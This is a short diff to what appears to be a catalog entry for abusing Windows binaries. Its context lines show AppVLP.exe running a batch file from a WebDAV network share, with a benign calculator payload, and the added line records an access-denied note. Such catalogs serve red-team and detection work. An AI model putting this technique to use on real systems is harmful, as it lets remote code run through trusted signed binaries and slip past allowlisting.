@@ -14,3 +14,5 @@ C:\Program Files (x86)\Microsoft Office\root\client>AppVLP.exe \\webdav\calc.bat
 C:\Program Files\WindowsApps\Microsoft.WindowsCalculator_10.1706.1862.0_x64__8wekyb3d8bbwe\Calculator.exe" -ServerName:App.AppXsm3pg4n7er43kdh1qp4e79f1j7am68r8.mca
 ```
 
+### Notes
+- Access denied when ran from System32
